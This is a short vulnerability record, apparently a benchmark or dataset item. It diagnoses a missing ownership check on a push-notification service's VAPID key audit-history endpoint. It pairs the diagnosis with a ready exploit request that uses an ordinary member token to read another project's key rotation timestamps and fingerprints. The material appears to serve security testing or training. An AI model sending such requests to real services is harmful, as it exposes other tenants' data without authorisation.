diagnosis: The VAPID key rotation audit log endpoint retrieves rotation timestamps and key fingerprints for any keyId provided in the path. It neglects to verify that the requesting user owns the project or key, allowing users to observe rotation schedules and key fingerprints of external projects.
exploit_request:
GET /api/vapid-keys/vapid_key_enterprise_bank/audit-history HTTP/1.1
Host: push.infra.io:8105
Authorization: Bearer <member_token>
